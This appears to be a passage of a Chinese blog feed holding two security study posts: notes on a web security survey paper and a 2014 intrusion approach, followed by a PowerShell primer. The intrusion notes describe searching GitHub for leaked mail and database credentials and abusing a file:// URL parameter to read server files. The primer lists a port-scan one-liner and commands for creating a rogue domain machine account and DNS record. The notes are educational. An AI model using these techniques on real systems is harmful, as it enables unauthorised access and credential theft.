    <content type="html"><![CDATA[<h1 id="NOTE-2020-3-1"><a href="#NOTE-2020-3-1" class="headerlink" title="NOTE-2020/3/1"></a>NOTE-2020/3/1</h1><h2 id="明天上班，今天啥也不想学"><a href="#明天上班，今天啥也不想学" class="headerlink" title="明天上班，今天啥也不想学"></a>明天上班，今天啥也不想学</h2><h2 id="读论文"><a href="#读论文" class="headerlink" title="读论文"></a>读论文</h2><p>帮女朋友看毕设，就得读论文，来总结一下吧：</p><ul><li>《A Survey on Web Application Security.》<blockquote><p><strong>我们使用三个组件来组织调查，以评估Web应用程序（或配备防御机制）的安全性：系统模型，威胁模型和安全性。系统模型描述了Web应用程序的工作方式及其独特特性。威胁模型描述了攻击者拥有的力量和资源；安全属性定义了开发人员想要的Web应用程序行为的方面。在给定威胁模型的情况下，如果一个Web应用程序在所有情况下都无法保留某些安全属性，则该应用程序将不安全或容易受到相应攻击。</strong></p></blockquote><ol><li>web应用程序：<ul><li>语言：**<em>一个PHP文件可能同时包含静态HTML标记和PHP函数，而一个网页可能嵌入了可执行的JavaScript代码。通过非结构化的字节序列表示应用程序数据和代码是Web应用程序的独特功能，可帮助提高开发效率。**</em></li><li>状态：**<em>会话状态可以在客户端（通过cookie，隐藏表单或URL重写）或服务器端维护。**</em></li><li>逻辑：**<em>身份验证和授权是许多Web应用程序中控制流的常见部分，通过Web应用程序可以限制其敏感信息和未授权用户的特权操作**</em></li></ul></li><li>web安全属性：<ul><li><strong><em>输入有效性</em></strong> 意味着用户输入应先经过验证，然后才能被Web应用程序使用。*<strong>状态完整性*** 意味着应保持应用程序状态不受干扰；*</strong>逻辑正确性*** 意味着应按照开发人员的预期正确执行应用程序逻辑。</li></ul><ol><li>输入：一句话 “控制输入，过滤输出”</li><li>状态：没啥好说的，就是防止篡改，”检查源头,高度随机”</li><li>逻辑：**<em>用户只能访问授权的信息和操作，并被强制遵循Web应用程序提供的预期工作流。**</em></li></ol></li><li>防御：<ul><li>输入有效性：大概就是过滤，控制<ol><li>用户输入标识，这要求可靠地标识所有不受信任的用户数据并将其与受信任的Web内容分开。（寻找危险输入点）</li><li>用户输入跟踪，要求用户数据在应用程序内的整个流中以一定的粒度可靠地被识别；（全局可控，就像代码审计我们第一步都是找可控的输入点，然后查询这个输入点的运动轨迹）</li><li>用户输入处理，这要求正确处理用户数据，并因此由应用程序以安全方式使用。（过滤呗）（各种过滤：白名单，过滤函数，waf）</li></ol><ul><li>后面都是具体实现，，我也没特别看明白。比如强类型语言haskell开发的框架，可以很好的区分输入和web内容<br>（百度了一下根本没人用）</li></ul></li><li>验证：<ol><li>分析：静态，动态和混合分析。<ul><li>静态：就是单纯从代码层分析危险的地方。会有很多误报。比如 <em>rips</em> (服务器里有)</li></ul></li><li>动态：顾名思义，不分析代码，分析运行时的信息流。</li></ol></li><li>测试：<ul><li>黑盒：web扫描。**<em>“从已知的攻击模式库中生成输入向量”**</em> <ul><li>fuzz(模糊测试)：**<em>传统的模糊测试方法将随机输入反馈到Web应用程序中。**</em> (就是也知道程序怎么写的，就随机去尝试，比如爆破,明白了吧)</li></ul></li></ul></li><li>逻辑正确性：<blockquote><p>用户只能访问授权的信息和操作，并被强制遵循Web应用程序提供的预期工作流。</p></blockquote><ol><li>构造安全：就构造的时候注意安全行呗。</li><li>验证安全：一样的，静态动态，机制差不多<ol><li><p>静态：</p><blockquote><p>首先，分析每个模块（在本例中为PHP文件）以提取“状态视图”，该视图表示此模块对状态变量的影响。然后，将单独的状态视图连接起来以导出预期的工作流图。他们在工作流图上应用模型检查，以识别可能发生的违反图遍历的情况，这表明存在违反工作流的漏洞</p></blockquote></li><li><p>动态： </p><blockquote><p>首先，他们通过动态执行在每个程序功能上为会话变量和函数参数得出基于值的可能不变量，从而推断出应用程序的规格。然后，他们对应用程序源代码执行模型检查并与符号执行相结合，以识别对推断不变式的违反。特别是，它们仅利用“可靠的”不变量，这些不变量由沿代码内控制路径的显式检查支持，并捕获会话变量和数据库对象之间的关系。</p></blockquote></li></ol><ul><li>EAR(重定向后执行漏洞): <strong><em>当一个web应用返回重定向头给用户时，没有停止而是继续执行之后的代码</em></strong>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> (!(request.get<span class="hljs-constructor">Parameter(“<span class="hljs-params">pass</span>”)</span>.equals(adminPswd))) &#123;<br>                    response.send<span class="hljs-constructor">Redirect(“<span class="hljs-params">login</span>.<span class="hljs-params">jsp</span>”)</span>;  &#125;<br>            <br>                admin.crit<span class="hljs-constructor">Func()</span>;<br></code></pre></td></tr></table></figure>   比如上面的代码，如果验证失败，跳转到login页面，但是还会执行critFunc()。</li></ul></li></ol></li></ul></li></ol></li></ul><h2 id="渗透阿里案例"><a href="#渗透阿里案例" class="headerlink" title="渗透阿里案例"></a>渗透阿里案例</h2><ul><li><p>时间：2014年</p><blockquote><p>安全在其特性上是强烈依赖业务的，因为如果没有业务，安全的价值就不复存在。</p></blockquote></li><li><p>思路：</p><ul><li><p>利用二级域名在github尝试搜索相关代码。</p><blockquote><p>最直接的就是用户账号密码、以及入口点</p></blockquote></li><li><p>代码里会放密码的主要是邮件等相关，关键词：smtp，jdbc</p></li><li><p>业务post的值是一个url，<code>url=http://example.com</code> 将http协议改为file协议可以读文件。</p><ul><li>redhat系统可以读文件夹名，内容为文件夹内的文件。</li></ul></li></ul></li></ul><p><strong>算是一个思路的拓宽吧，大型目标渗透要依据业务！！</strong></p>]]></content>
    
    
    <categories>
      
      <category>旧的归档</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>powershell的应用</title>
    <link href="/2021/02/03/ps/"/>
    <url>/2021/02/03/ps/</url>
    
    <content type="html"><![CDATA[<h1 id="powershell-应用"><a href="#powershell-应用" class="headerlink" title="powershell 应用"></a>powershell 应用</h1><ul><li>执行powershell脚本需要先：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> RemoteSigned<br></code></pre></td></tr></table></figure>  <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="bash"> /c powershell <span class="hljs-string">&quot;Set-ExecutionPolicy RemoteSigned&quot;</span></span><br></code></pre></td></tr></table></figure></li><li>写入到文件：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">write-output</span> <span class="hljs-string">&quot;xxx&quot;</span> &gt;&gt; <span class="hljs-string">&quot;C:\Users\Simba\Desktop\test5.txt&quot;</span><br></code></pre></td></tr></table></figure></li><li>代替wmic:  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-class</span> win32_product | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-property</span> name,version<br></code></pre></td></tr></table></figure></li><li>端口扫描：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">134</span>..<span class="hljs-number">136</span> | % &#123;<span class="hljs-built_in">write-output</span> ((<span class="hljs-built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-variable">$_</span>)) <span class="hljs-string">&quot;Port <span class="hljs-variable">$_</span> is open!&quot;</span> &gt;&gt; <span class="hljs-string">&quot;C:\Users\Simba\Desktop\test5.txt&quot;</span>&#125; <span class="hljs-number">2</span>&gt;<span class="hljs-variable">$null</span><br></code></pre></td></tr></table></figure></li><li>域内创建机器用户：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> testNew <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;123456789&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>)<br></code></pre></td></tr></table></figure></li><li>域内创建dns记录：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-DNSUpdate</span> <span class="hljs-literal">-DNSType</span> A <span class="hljs-literal">-DNSName</span> testNew <span class="hljs-literal">-DNSData</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.111</span><br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="好了以下是正经学习"><a href="#好了以下是正经学习" class="headerlink" title="好了以下是正经学习"></a>好了以下是正经学习</h2><ul><li><p>cmdlet</p><p>  ps创建的新的命令模式，调用为 动词+名词 的格式，比如：<code>Get-Command</code> , <code>Get-Help</code>。</p><p>  <code>Get-Command -Name</code> 查看所有命令</p><p>  <code>Get-Help</code> 查看命令帮助</p></li><li><p><code>$?</code> 获取命令执行是否成功</p></li><li><p>用 <code>&#123;&#125;</code> 包裹可执行的powershell脚本快,也可以用 <code>$scriptblock = [ScriptBlock]::Create(&#39;xxx&#39;)</code> 动态创建。</p></li><li><p>别名</p><p>  内置命令一般拥有别名，可以使用Get-Help查看</p></li><li><p>重定向输出</p><p>  可以使用 <code>Out-File</code> 或者 <code>&gt;</code></p></li><li><p>运算符（比较，通配，包含替换，分割连接）</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-operator">-gt</span>     大于<br><span class="hljs-operator">-ge</span>     大于等于<br><span class="hljs-operator">-lt</span>     小于<br><span class="hljs-operator">-le</span>     小于等于<br><span class="hljs-operator">-eq</span>     等于<br><span class="hljs-operator">-ne</span>     不等于<br></code></pre></td></tr></table></figure><p>  <code>-like</code> 和 <code>-nolike</code> 用于通配符（<code>?</code>、<code>*</code>）</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\Desktop&gt; <span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;zhang3&#x27;</span> <span class="hljs-operator">-contains</span> <span class="hljs-string">&#x27;zhang3&#x27;</span><br>True<br><br><span class="hljs-built_in">PS</span> D:\Desktop&gt; <span class="hljs-string">&#x27;hello zhang3&#x27;</span> <span class="hljs-operator">-replace</span> <span class="hljs-string">&#x27;zhang3&#x27;</span>,<span class="hljs-string">&#x27;yitian&#x27;</span><br>hello yitian<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\Desktop&gt; <span class="hljs-string">&#x27;A B C DE&#x27;</span> <span class="hljs-operator">-split</span> <span class="hljs-string">&#x27; &#x27;</span><br>A<br>B<br>C<br>DE<br><span class="hljs-built_in">PS</span> D:\Desktop&gt; <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span> <span class="hljs-operator">-join</span> <span class="hljs-string">&#x27;,&#x27;</span><br>A,B,C<br></code></pre></td></tr></table></figure></li><li><p>逻辑</p>  <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-and    与</span><br><span class="hljs-deletion">-or     或</span><br><span class="hljs-deletion">-xor    异或</span><br><span class="hljs-addition">!/-not  非</span><br></code></pre></td></tr></table></figure></li><li><p><code>-f</code> 格式化字符串，等于python的 <code>format</code></p></li><li><p>判断</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$condition</span> = <span class="hljs-variable">$true</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$condition</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>) &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;condition is <span class="hljs-variable">$true</span>&quot;</span><br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$condition</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$true</span> ) &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;condition is <span class="hljs-variable">$false</span>&quot;</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;other ocndition&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>循环</p><p>  do:</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-variable">$i</span>++<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$i</span><br>&#125;<span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>  while:</p>  <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$i</span> = 0</span><br><span class="hljs-keyword">while</span> (<span class="hljs-symbol">$</span>i -<span class="hljs-keyword">lt</span> <span class="hljs-number">3</span>) &#123;<br>    Write-Output <span class="hljs-symbol">$</span>i<br>    <span class="hljs-symbol">$</span>i++<br>&#125;<br></code></pre></td></tr></table></figure><p>  for:</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">3</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$i</span><br>&#125;<br></code></pre></td></tr></table></figure><p>  foreach:</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$array</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>)<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$i</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$array</span>) &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$i</span><br>&#125;<br></code></pre></td></tr></table></figure><p>  另一种用法：</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&lt;command&gt; | <span class="hljs-keyword">foreach</span> &#123;&lt;beginning command_block&gt;&#125;&#123;&lt;middle command_block&gt;&#125;&#123;&lt;ending command_block&gt;&#125;<br></code></pre></td></tr></table></figure><p>  使用这种方法时，for-each后面可以跟三个语句块，第一个语句块是开始语句块，在循环前执行一次，常用来初始化一些数据；第三个是结束语句块，在循环结束之后执行一次，常用于统计一些循环数据；第二个就是正常的循环语句块，会循环多次。</p><p>  foreach-object:</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 获取所有的服务，并获取对呀进程ID是否大于100</span><br><span class="hljs-built_in">Get-WmiObject</span> Win32_Service | <span class="hljs-built_in">ForEach-Object</span> &#123;<span class="hljs-string">&quot;Name:&quot;</span>+ <span class="hljs-variable">$_</span>.DisplayName, <span class="hljs-string">&quot;, Is ProcessId more than 100:&quot;</span> + (<span class="hljs-variable">$_</span>.ProcessId <span class="hljs-operator">-gt</span> <span class="hljs-number">100</span>)&#125;<br></code></pre></td></tr></table></figure></li><li><p>函数</p><p>  声明：</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Say-Hello</span> <span class="hljs-params">([string] <span class="hljs-variable">$name</span>)</span></span> &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;Hello, <span class="hljs-variable">$name</span>&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>  调用：</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Say<span class="hljs-literal">-Hello</span> <span class="hljs-literal">-name</span> <span class="hljs-string">&#x27;yitian&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>异常处理</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">Try</span>&#123;<br>    <span class="hljs-variable">$connection</span>.open()<br>    <span class="hljs-variable">$success</span> = <span class="hljs-variable">$true</span><br>&#125;<span class="hljs-keyword">Catch</span>&#123;<br>    <span class="hljs-variable">$success</span> = <span class="hljs-variable">$false</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>数组</p><p>  数组创建:</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$array</span> = <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><span class="hljs-variable">$array</span> = <span class="hljs-number">1</span>..<span class="hljs-number">4</span><br><span class="hljs-variable">$array</span>=<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2017&quot;</span>,([<span class="hljs-type">System.Guid</span>]::NewGuid()),(<span class="hljs-built_in">get-date</span>)<br><span class="hljs-variable">$a</span>=<span class="hljs-selector-tag">@</span>()  <span class="hljs-comment"># 空数组</span><br><span class="hljs-variable">$a</span>=,<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-comment"># 一个元素的数组</span><br></code></pre></td></tr></table></figure><p>  数组访问：</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$ip</span> = ipconfig<br><span class="hljs-variable">$ip</span>[<span class="hljs-number">1</span>] <span class="hljs-comment"># 获取ipconfig第二行的数据</span><br></code></pre></td></tr></table></figure></li><li><p>哈希表</p><p>  哈希表创建：</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$stu</span>=<span class="hljs-selector-tag">@</span>&#123; Name = <span class="hljs-string">&quot;test&quot;</span>;Age=<span class="hljs-string">&quot;12&quot;</span>;sex=<span class="hljs-string">&quot;man&quot;</span> &#125;<br></code></pre></td></tr></table></figure><ul><li><p>哈希表里可以存数组</p><p>哈希表的加入与删除：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$Student</span>=<span class="hljs-selector-tag">@</span>&#123;&#125;<br><span class="hljs-variable">$Student</span>.Name=<span class="hljs-string">&quot;hahaha&quot;</span><br><span class="hljs-variable">$stu</span>.Remove(<span class="hljs-string">&quot;Name&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>对象</p><p>  创建对象：</p><ul><li><p>使用 <code>New-object</code> 创建对象</p><p>增加属性：</p></li><li><p>使用 <code>Add-Member</code> 增加属性和方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$pocketknife</span> <span class="hljs-literal">-Name</span> Color <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;Red&quot;</span> <span class="hljs-literal">-MemberType</span> NoteProperty<br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-variable">$pocketknife</span><br><br>Color<br>-----<br>Red<br><br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$pocketknife</span> <span class="hljs-literal">-Name</span> Weight <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;55&quot;</span><br><span class="hljs-literal">-MemberType</span> NoteProperty<br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-variable">$pocketknife</span> | <span class="hljs-built_in">Add-Member</span> NoteProperty Blades <span class="hljs-number">3</span><br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-variable">$pocketknife</span> | <span class="hljs-built_in">Add-Member</span> NoteProperty Manufacturer ABC<br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-variable">$pocketknife</span><br><br>Color Weight Blades Manufacturer<br>----- ------ ------ ------------<br>Red   <span class="hljs-number">55</span>          <span class="hljs-number">3</span> ABC<br></code></pre></td></tr></table></figure><p>增加方法：</p><p>将 <code>Add-Member</code> 中的 <code>NoteProperty</code> 改成 <code>ScriptMethod</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 增加一个新方法:</span><br><span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-memberType</span> ScriptMethod <span class="hljs-operator">-In</span> <span class="hljs-variable">$pocketknife</span> `<br><span class="hljs-literal">-name</span> cut <span class="hljs-literal">-Value</span> &#123; <span class="hljs-string">&quot;I&#x27;m whittling now&quot;</span> &#125;<br><span class="hljs-comment"># 指定参数类型增加一个新方法:</span><br><span class="hljs-built_in">Add-Member</span> <span class="hljs-operator">-in</span> <span class="hljs-variable">$pocketknife</span> ScriptMethod screw &#123; <span class="hljs-string">&quot;Phew...it&#x27;s in!&quot;</span> &#125;<br><span class="hljs-comment">#直接通过管道增加一个新方法:</span><br><span class="hljs-variable">$pocketknife</span> | <span class="hljs-built_in">Add-Member</span> ScriptMethod corkscrew &#123; <span class="hljs-string">&quot;Pop! Cheers!&quot;</span> &#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>执行脚本里的函数</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .script.ps1<br></code></pre></td></tr></table></figure></li><li><p>cmd调用powershell</p>  <figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7">PowerShell<span class="hljs-comment">[.exe]</span><br>    <span class="hljs-comment">[-PSConsoleFile &lt;file&gt; | -Version &lt;version&gt;]</span><br>    <span class="hljs-comment">[-EncodedCommand &lt;Base64EncodedCommand&gt;]</span><br>    <span class="hljs-comment">[-ExecutionPolicy &lt;ExecutionPolicy&gt;]</span><br>    <span class="hljs-comment">[-File &lt;filePath&gt; &lt;args&gt;]</span><br>    <span class="hljs-comment">[-InputFormat &#123;Text | XML&#125;]</span> <br>    <span class="hljs-comment">[-NoExit]</span><br>    <span class="hljs-comment">[-NoLogo]</span><br>    <span class="hljs-comment">[-NonInteractive]</span> <br>    <span class="hljs-comment">[-NoProfile]</span> <br>    <span class="hljs-comment">[-OutputFormat &#123;Text | XML&#125;]</span> <br>    <span class="hljs-comment">[-Sta]</span><br>    <span class="hljs-comment">[-WindowStyle &lt;style&gt;]</span><br>    <span class="hljs-comment">[-Command &#123; - | &lt;script-block&gt; <span class="hljs-comment">[-args &lt;arg-array&gt;]</span></span><br><span class="hljs-comment">                    | &lt;string&gt; <span class="hljs-comment">[&lt;CommandParameters&gt;]</span> &#125; ]</span><br></code></pre></td></tr></table></figure><p>名称 |    解释</p></li></ul><p>—|—<br>-Command |    需要执行的代码<br>-ExecutionPolicy |    设置默认的执行策略，一般使用Bypass<br>-EncodedCommand    | 执行Base64代码<br>-File | 这是需要执行的脚本名<br>-NoExit|执行完成命令之后不会立即退出，比如我们执行powerhsell whoami 执行完成之后会推出我们的PS会话，如果我们加上这个参数，运行完之后还是会继续停留在PS的界面<br>-NoLogo | 不输出PS的Banner信息<br>-Noninteractive | 不开启交互式的会话<br>-NoProfile | 不使用当前用户使用的配置文件<br>-Sta | 以单线程模式启动ps<br>-Version | 设置用什么版本去执行代码<br>-WindowStyle | 设置Powershell的执行窗口，有下面的参数Normal, Minimized, Maximized, or Hidden</p><hr><h2 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h2><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>Restricted</td><td>受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？Set-ExecutionPolicy -ExecutionPolicy Bypass就是设置策略为Bypass这样就可以执行脚本了。</td></tr><tr><td>AllSigned</td><td>AllSigned 执行策略允许执行所有具有数字签名的脚本</td></tr><tr><td>RemoteSigned</td><td>当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</td></tr><tr><td>Unrestricted</td><td>这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本</td></tr><tr><td>Bypass</td><td>Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</td></tr><tr><td>Undefined</td><td>Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。</td></tr></tbody></table><hr><h2 id="一些应用"><a href="#一些应用" class="headerlink" title="一些应用"></a>一些应用</h2><ul><li><p>获取文件信息：</p>  <figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-built_in">Item</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">Cmder</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><span class="hljs-operator">|</span><span class="hljs-built_in">Select</span><span class="hljs-operator">-</span><span class="hljs-variable">Object</span> <span class="hljs-operator">*</span><br></code></pre></td></tr></table></figure></li><li><p>文件过滤：</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ChildItem</span>|<span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span> <span class="hljs-operator">-match</span> <span class="hljs-string">&#x27;\w*.md$&#x27;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.Length/<span class="hljs-number">1</span>kb <span class="hljs-operator">-gt</span> <span 